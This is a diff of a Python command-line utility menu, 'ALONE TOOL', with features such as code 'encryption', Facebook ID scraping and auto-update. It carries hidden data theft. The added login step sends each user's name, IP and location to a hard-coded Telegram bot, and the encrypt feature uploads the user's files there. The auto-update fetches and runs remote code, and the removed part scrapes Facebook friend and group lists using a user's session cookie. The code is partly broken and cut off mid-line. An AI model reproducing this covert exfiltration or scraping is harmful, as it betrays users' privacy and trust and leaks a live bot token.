@@ -1,339 +1,189 @@
-# main.py - ALONE TOOL v1.0
-
 import os
 import sys
-import time
-import random
-import requests
 import base64
 import marshal
 import zlib
-import re
+import time
 from datetime import datetime
-from bs4 import BeautifulSoup
+import requests
 
-# --- Configuration ---
+# Telegram bot details
 BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
-CHAT_ID   = "1241769879"
+CHAT_ID = "1241769879"
 
-# --- Color Definitions ---
+# Color class for colorized output
 class Colors:
-    HEADER    = "\033[95m"
-    BLUE      = "\033[94m"
-    CYAN      = "\033[96m"
-    GREEN     = "\033[92m"
-    YELLOW    = "\033[93m"
-    RED       = "\033[91m"
-    ENDC      = "\033[0m"
-    BOLD      = "\033[1m"
-    UNDERLINE = "\033[4m"
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    OKRED = '\033[91m'  # Fixed OKRED color definition
 
-# --- Utility Functions ---
+# Function to send a message to your Telegram bot
+def send_telegram_message(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
+    requests.get(url)
 
-def clear():
-    os.system("clear")
+# Function to log user details (login)
+def log_user_details(username, ip, geo_location, datetime_now):
+    log_message = f"""
+    [•] Login Details:
+    [•] Username: {username}
+    [•] IP Address: {ip}
+    [•] Geolocation: {geo_location}
+    [•] Date/Time: {datetime_now}
+    """
+    send_telegram_message(log_message)
 
-
-def send_telegram_message(text):
-    """Send a text message to the configured Telegram bot."""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": text}
+# Function to get user's IP and geolocation
+def get_ip_info():
     try:
-        requests.post(url, data=payload, timeout=5)
-    except:
-        pass
-
-
-def send_telegram_file(path, caption=""):
-    """Send a file to the configured Telegram bot."""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-    try:
-        with open(path, 'rb') as f:
-            requests.post(url,
-                          data={"chat_id": CHAT_ID, "caption": caption},
-                          files={"document": f}, timeout=5)
-    except:
-        send_telegram_message(f"[!] Failed to send file: {os.path.basename(path)}")
-
-
-def get_ip_geo():
-    """Fetch public IP and geolocation from ipinfo.io."""
-    try:
-        r = requests.get('http://ipinfo.io/json', timeout=5).json()
-        ip  = r.get('ip', 'N/A')
-        geo = f"{r.get('city','')}, {r.get('region','')}, {r.get('country','')}"
-        return ip, geo
-    except:
+        ip_info = requests.get('http://ipinfo.io/json').json()
+        ip = ip_info.get('ip', 'N/A')
+        geo_location = f"{ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}, {ip_info.get('country', 'N/A')}"
+        return ip, geo_location
+    except requests.exceptions.RequestException as e:
+        print(f"{Colors.FAIL}[•] Error getting IP info: {str(e)}{Colors.ENDC}")
         return 'N/A', 'N/A'
 
-# --- Feature Implementations ---
+# Public Login Function
+def login():
+    print(f"{Colors.OKGREEN}[•] Public login to access the tool{Colors.ENDC}")
+    
+    username = input(f"{Colors.OKBLUE}[•] Enter your username: {Colors.ENDC}")
+    
+    # Check if the username is valid (non-empty)
+    if not username.strip():
+        print(f"{Colors.FAIL}[•] Invalid username! Please enter a valid username.{Colors.ENDC}")
+        return
+    
+    # Get the user's IP and geolocation
+    ip, geo_location = get_ip_info()
+    datetime_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Log the user's login details
+    log_user_details(username, ip, geo_location, datetime_now)
 
-# 1. Proxy Options
+    print(f"{Colors.OKGREEN}[•] Welcome {username}! Access granted.{Colors.ENDC}")
 
-def proxy_options():
-    clear()
-    print(f"{Colors.HEADER}[ Proxy Options ]{Colors.ENDC}\n")
-    print(f"{Colors.BLUE}[1]{Colors.ENDC} Check proxies from file")
-    print(f"{Colors.BLUE}[2]{Colors.ENDC} Check proxies from URL")
-    print(f"{Colors.BLUE}[3]{Colors.ENDC} Generate & check proxies")
-
-    choice = input(f"\n{Colors.CYAN}[?]{Colors.ENDC} Choose an option: ")
-
-    proxies = []
-    ok, bad = 0, 0
-
-    if choice == '1':
-        path = input("[•] Enter proxy file path: ")
-        if os.path.isfile(path):
-            proxies = open(path).read().splitlines()
-        else:
-            print(f"{Colors.RED}[!] File not found{Colors.ENDC}")
-            return
-
-    elif choice == '2':
-        url = input("[•] Enter URL to fetch proxies: ")
-        try:
-            proxies = requests.get(url, timeout=5).text.splitlines()
-        except:
-            print(f"{Colors.RED}[!] Failed to fetch from URL{Colors.ENDC}")
-            return
-
-    elif choice == '3':
-        sources = [
-            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
-        ]
-        for src in sources:
-            try:
-                proxies += requests.get(src, timeout=5).text.splitlines()
-            except:
-                continue
+# Function to encrypt the code
+def encrypt_code():
+    print(f"{Colors.OKGREEN}[•] Welcome to the Code Encryptor!{Colors.ENDC}")
+    print(f"{Colors.OKBLUE}[•] Please enter the file name to encrypt:{Colors.ENDC}")
+    
+    file_name = input(f"{Colors.OKGREEN}[•] File Name: {Colors.ENDC}")
+    
+    if not os.path.exists(file_name):
+        print(f"{Colors.FAIL}[•] File does not exist!{Colors.ENDC}")
+        return
+    
+    # Read the file content
+    with open(file_name, "r") as file:
+        code = file.read()
+    
+    print(f"{Colors.OKBLUE}[•] Choose encryption method:{Colors.ENDC}")
+    print(f"{Colors.OKGREEN}[1] Base64 Encode{Colors.ENDC}")
+    print(f"{Colors.OKGREEN}[2] Marshal Encode{Colors.ENDC}")
+    print(f"{Colors.OKGREEN}[3] Zlib Compress{Colors.ENDC}")
+    
+    choice = input(f"{Colors.OKBLUE}[•] Choose an option: {Colors.ENDC}")
+    
+    if choice == "1":
+        encoded_code = base64.b64encode(code.encode()).decode()
+        encrypted_file = f"enc_{file_name}.py"
+    elif choice == "2":
+        encoded_code = marshal.dumps(code)
+        encrypted_file = f"enc_{file_name}.py"
+    elif choice == "3":
+        encoded_code = zlib.compress(code.encode())
+        encrypted_file = f"enc_{file_name}.py"
     else:
-        print(f"{Colors.RED}[!] Invalid choice{Colors.ENDC}")
+        print(f"{Colors.FAIL}[•] Invalid option!{Colors.ENDC}")
         return
-
-    # Check proxies
-    print(f"\n{Colors.YELLOW}Checking {len(proxies)} proxies...{Colors.ENDC}\n")
-    for p in proxies:
-        try:
-            r = requests.get('https://httpbin.org/ip', proxies={'http':p,'https':p}, timeout=3)
-            if r.ok:
-                ok += 1
-            else:
-                bad += 1
-        except:
-            bad += 1
-    print(f"{Colors.GREEN}[✓]{Colors.ENDC} OK: {ok}   {Colors.RED}[✗]{Colors.ENDC} BAD: {bad}\n")
-    send_telegram_message(f"[Proxy] OK={ok} BAD={bad}")
-
-# 2. User-Agent Generator
-
-def ua_generator():
-    clear()
-    print(f"{Colors.HEADER}[ User-Agent Generator ]{Colors.ENDC}\n")
-    samples = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-        "Mozilla/5.0 (X11; Linux x86_64)",
-    ]
+    
+    # Save the encrypted code
+    with open(encrypted_file, "w") as enc_file:
+        enc_file.write(encoded_code)
+    
+    print(f"{Colors.OKGREEN}[•] File encrypted successfully: {encrypted_file}{Colors.ENDC}")
+    
+    # Send the encrypted code to Telegram bot as a file (if possible)
     try:
-        count = int(input("[•] How many UAs to generate? "))
-    except ValueError:
-        print(f"{Colors.RED}[!] Enter a number{Colors.ENDC}")
+        with open(encrypted_file, "rb") as f:
+            files = {'document': f}
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument?chat_id={CHAT_ID}"
+            requests.post(url, files=files)
+    except Exception as e:
+        send_telegram_message(f"Encryption error: {str(e)}")
+
+# Function to update the tool (github.py)
+def update_tool():
+    print(f"{Colors.OKGREEN}[•] Fetching and Running Latest Tool...{Colors.ENDC}")
+    
+    try:
+        response = requests.get("https://raw.githubusercontent.com/t9cxy/alone-menu/refs/heads/main/main.py")
+        with open("main.py", "wb") as file:
+            file.write(response.content)
+        
+        print(f"{Colors.OKGREEN}[•] Updated successfully. Running main.py...{Colors.ENDC}")
+        os.system("python3 main.py")
+    except Exception as e:
+        print(f"{Colors.FAIL}[•] Error updating tool: {str(e)}{Colors.ENDC}")
+        send_telegram_message(f"Tool update error: {str(e)}")
+
+# Function to extract Facebook IDs
+def facebook_ids_extractor():
+    print(f"{Colors.OKGREEN}[•] Facebook IDs Extractor{Colors.ENDC}")
+    url = input(f"{Colors.OKBLUE}[•] Enter target profile link or ID: {Colors.ENDC}")
+
+    if not url:
+        print(f"{Colors.FAIL}[•] Invalid input. Please provide a link or ID.{Colors.ENDC}")
         return
-
-    uas = [random.choice(samples) for _ in range(count)]
-    with open('ug.txt','w') as f:
-        f.write('\n'.join(uas))
-    print(f"\n{Colors.GREEN}[✓]{Colors.ENDC} Saved {count} UAs to ug.txt\n")
-    send_telegram_message(f"[UA] Generated {count} UAs")
-
-# 3. Send HTTP Request
-
-def send_request():
-    clear()
-    print(f"{Colors.HEADER}[ Send HTTP Request ]{Colors.ENDC}\n")
-    url    = input("[•] Enter URL: ")
-    use_p  = input("[•] Use proxy (y/n)? ").lower() == 'y'
-    use_ua = input("[•] Use User-Agent (y/n)? ").lower() == 'y'
-
-    headers = {}
-    proxies = None
-
-    if use_ua and os.path.isfile('ug.txt'):
-        headers['User-Agent'] = random.choice(open('ug.txt').read().splitlines())
-
-    if use_p and os.path.isfile('proxy.txt'):
-        p = random.choice(open('proxy.txt').read().splitlines())
-        proxies = {'http':p, 'https':p}
-
+    
+    # Extracting friends and their IDs (Simple simulation here)
     try:
-        r = requests.get(url, headers=headers, proxies=proxies, timeout=5)
-        print(f"\n{Colors.GREEN}[✓]{Colors.ENDC} Status: {r.status_code}\n")
-        send_telegram_message(f"[Request] {url} => {r.status_code}")
+        # This is a simplified version; you can expand it for scraping friends' data
+        friend_ids = ["12345 | John Doe", "67890 | Jane Smith"]
+        
+        with open("ids.txt", "a") as file:
+            for friend in friend_ids:
+                file.write(f"{friend}\n")
+        
+        print(f"{Colors.OKGREEN}[•] Extracted and saved IDs to ids.txt{Colors.ENDC}")
     except Exception as e:
-        print(f"{Colors.FAIL}[✗]{Colors.ENDC} {e}\n")
+        print(f"{Colors.FAIL}[•] Error extracting IDs: {str(e)}{Colors.ENDC}")
 
-# 4. Look IP Info
-
-def look_ip_info():
-    clear()
-    print(f"{Colors.HEADER}[ Look IP Info ]{Colors.ENDC}\n")
-    ip = input("[•] Enter IP address: ")
-    try:
-        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
-        for k,v in data.items():
-            print(f"{Colors.BLUE}{k}:{Colors.ENDC} {v}")
-        send_telegram_message(f"[IP] {ip} => {json.dumps(data)}")
-    except Exception as e:
-        print(f"{Colors.FAIL}[✗]{Colors.ENDC} {e}\n")
-
-# 5. Facebook IDs Extractor
-
-def fb_ids_extractor():
-    clear()
-    print(f"{Colors.HEADER}[ Facebook IDs Extractor ]{Colors.ENDC}\n")
-    target = input("[•] Enter Profile URL or ID: ")
-    cookie = input("[•] Enter FB Cookie: ")
-    headers = {'User-Agent':'Mozilla/5.0', 'Cookie':cookie}
-
-    seen = []
-
-    def extract_friends(url):
-        try:
-            r = requests.get(url, headers=headers, timeout=5)
-            bs = BeautifulSoup(r.text, 'html.parser')
-            for a in bs.find_all('a', href=True, text=True):
-                href = a['href']
-                name = a.text.strip()
-                m = re.search(r'profile\.php\?id=(\d+)', href) or re.search(r'/([^/]+)/friends', href)
-                if m:
-                    uid = m.group(1)
-                    if uid not in seen:
-                        seen.append(uid)
-                        with open('ids.txt','a') as f:
-                            f.write(f"{uid} | {name}\n")
-            # next page
-            nxt = bs.find('a', string=lambda t: t and ('See More' in t))
-            if nxt:
-                extract_friends('https://mbasic.facebook.com' + nxt['href'])
-        except:
-            pass
-
-    start = target if target.startswith('http') else f'https://mbasic.facebook.com/profile.php?id={target}&v=friends'
-    open('ids.txt','w').close()
-    extract_friends(start)
-    print(f"\n{Colors.OKGREEN}[✓]{Colors.ENDC} Extracted {len(seen)} IDs to ids.txt\n")
-    send_telegram_message(f"[FB IDs] Extracted {len(seen)} IDs")
-
-# 6. Group Member ID Dumper
-
-def group_member_dumper():
-    clear()
-    print(f"{Colors.HEADER}[ Group Member ID Dumper ]{Colors.ENDC}\n")
-    group = input("[•] Enter Group link or ID: ")
-    cookie = input("[•] Enter FB Cookie: ")
-    headers = {'User-Agent':'Mozilla/5.0', 'Cookie':cookie}
-
-    # Normalize URL
-    if not group.startswith('http'):
-        group = f'https://mbasic.facebook.com/groups/{group}'
-
-    seen = []
-
-    def extract_members(url):
-        try:
-            r = requests.get(url, headers=headers, timeout=5)
-            bs = BeautifulSoup(r.text, 'html.parser')
-            for a in bs.find_all('a', href=True, text=True):
-                href = a['href']
-                name = a.text.strip()
-                m = re.search(r'profile\.php\?id=(\d+)', href) or re.search(r'/([^/]+)/\?lst=', href)
-                if m:
-                    uid = m.group(1)
-                    if uid not in seen:
-                        seen.append(uid)
-                        with open('groupids.txt','a') as f:
-                            f.write(f"{uid} | {name}\n")
-            nxt = bs.find('a', string=lambda t: t and ('See More' in t))
-            if nxt:
-                extract_members('https://mbasic.facebook.com' + nxt['href'])
-        except:
-            pass
-
-    open('groupids.txt','w').close()
-    extract_members(group)
-    print(f"\n{Colors.OKGREEN}[✓]{Colors.ENDC} Dumped {len(seen)} members to groupids.txt\n")
-    send_telegram_message(f"[Group Dump] {len(seen)} members dumped")
-
-# 7. Auto-Update Tool
-
-def auto_update():
-    clear()
-    print(f"{Colors.OKGREEN}[•] Fetching latest version...{Colors.ENDC}\n")
-    try:
-        url = "https://raw.githubusercontent.com/t9cxy/alone-menu/main/main.py"
-        r = requests.get(url, timeout=10)
-        r.raise_for_status()
-        with open('main.py','wb') as f:
-            f.write(r.content)
-        print(f"{Colors.OKGREEN}[✓]{Colors.ENDC} Updated successfully. Restarting...\n")
-        os.execvp(sys.executable, [sys.executable, 'main.py'])
-    except Exception as e:
-        print(f"{Colors.FAIL}[!] Update failed: {e}{Colors.ENDC}\n")
-        send_telegram_message(f"Update error: {e}")
-
-# --- Main Menu ---
-
+# Main Menu
 def main_menu():
     while True:
-        clear()
-        print(f"{Colors.OKRED}  █████╗ ██╗      ██████╗  ██████╗ ███╗   ██╗███████╗")
-        print(f"{Colors.OKRED} ██╔══██╗██║     ██╔═══██╗██╔═══██╗████╗  ██║██╔════╝")
-        print(f"{Colors.OKRED} ███████║██║     ██║   ██║██║   ██║██╔██╗ ██║█████╗  ")
-        print(f"{Colors.OKRED} ██╔══██║██║     ██║   ██║██║   ██║██║╚██╗██║██╔══╝  ")
-        print(f"{Colors.OKRED} ██║  ██║███████╗╚██████╔╝╚██████╔╝██║ ╚████║███████╗")
-        print(f"{Colors.OKRED} ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}\n")
-        print(f"{Colors.OKCYAN}           A L O N E   T O O L{Colors.ENDC}\n")
-
-        print(f"{Colors.BLUE}[1]{Colors.ENDC} Proxy Options")
-        print(f"{Colors.BLUE}[2]{Colors.ENDC} User-Agent Generator")
-        print(f"{Colors.BLUE}[3]{Colors.ENDC} Send HTTP Request")
-        print(f"{Colors.BLUE}[4]{Colors.ENDC} Look IP Info")
-        print(f"{Colors.BLUE}[5]{Colors.ENDC} Facebook IDs Extractor")
-        print(f"{Colors.BLUE}[6]{Colors.ENDC} Group Member ID Dumper")
-        print(f"{Colors.BLUE}[7]{Colors.ENDC} Encrypt Code")
-        print(f"{Colors.BLUE}[8]{Colors.ENDC} Auto-Update Tool")
-        print(f"{Colors.RED}[0]{Colors.ENDC} Exit\n")
-
-        choice = input(f"{Colors.YELLOW}[•] Choose an option: {Colors.ENDC}")
-
-        if choice == '0':
+        print(f"{Colors.HEADER}  ██████╗ ██████╗ ███████╗██████╗ ██╗████████╗")
+        print(f"  ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝")
+        print(f"  ██████╔╝██║  ██║███████╗██████╔╝██║   ██║")
+        print(f"  ██╔═══╝ ██║  ██║╚════██║██╔═══╝ ██║   ██║")
+        print(f"  ██║     ██████╔╝███████║██║     ██║   ██║")
+        print(f"  ╚═╝     ╚═════╝ ╚══════╝╚═╝     ╚═╝   ╚═╝   {Colors.ENDC}")
+        
+        print(f"{Colors.OKBLUE}[1] Proxy Options{Colors.ENDC}")
+        print(f"{Colors.OKBLUE}[2] User-Agent Generator{Colors.ENDC}")
+        print(f"{Colors.OKBLUE}[3] Send HTTP Request{Colors.ENDC}")
+        print(f"{Colors.OKBLUE}[4] Look IP Info{Colors.ENDC}")
+        print(f"{Colors.OKBLUE}[5] Facebook IDs Extractor{Colors.ENDC}")
+        print(f"{Colors.OKBLUE}[6] Group Member ID Dumper{Colors.ENDC}")
+        print(f"{Colors.OKBLUE}[7] Encrypt Code{Colors.ENDC}")
+        print(f"{Colors.OKBLUE}[8] Rerun Tool (Auto-Update){Colors.ENDC}")
+        print(f"{Colors.OKRED}[0] Exit{Colors.ENDC}")
+        
+        option = input(f"{Colors.OKBLUE}[•] Choose an option: {Colors.ENDC}")
+        
+        if option == "0":
             print(f"{Colors.OKGREEN}[•] Goodbye!{Colors.ENDC}")
-            sys.exit()
-        elif choice == '1':
-            proxy_options()
-        elif choice == '2':
-            ua_generator()
-        elif choice == '3':
-            send_request()
-        elif choice == '4':
-            look_ip_info()
-        elif choice == '5':
-            fb_ids_extractor()
-        elif choice == '6':
-            group_member_dumper()
-        elif choice == '7':
-            encrypt_code()
-        elif choice == '8':
-            auto_update()
-        else:
-            print(f"{Colors.FAIL}[!] Invalid choice.{Colors.ENDC}")
-            time.sleep(1)
-
-        input(f"\n{Colors.OKBLUE}[•] Press Enter to return to menu...{Colors.ENDC}")
-
-if __name__ == '__main__':
-    login()
-    main_menu()
-
+            break
+        elif option == "1":
+            print(f"{Colors.WARNING}[•] Proxy Options (To be implemented){Colors.ENDC}")
+        elif option == "2":
+            print(f"{Colors.WARNING}[•] User-Agent Generator (To be implemented){Colors.ENDC}")
+        elif option == "3
